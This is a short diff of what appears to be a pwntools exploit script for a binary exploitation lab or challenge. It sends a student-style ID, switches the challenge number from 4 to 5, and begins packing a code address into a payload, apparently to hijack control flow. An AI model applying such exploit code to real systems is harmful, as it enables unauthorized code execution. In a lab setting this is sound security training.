@@ -11,7 +11,7 @@ nim = b"13522091;b60a8eed"
 p.sendline(nim)
 
 p.recvuntil(b"Challenge: ")
-kirim = b"4"
+kirim = b"5"
 p.sendline(kirim)
 
 temp = p64(0x0000000000400c60)
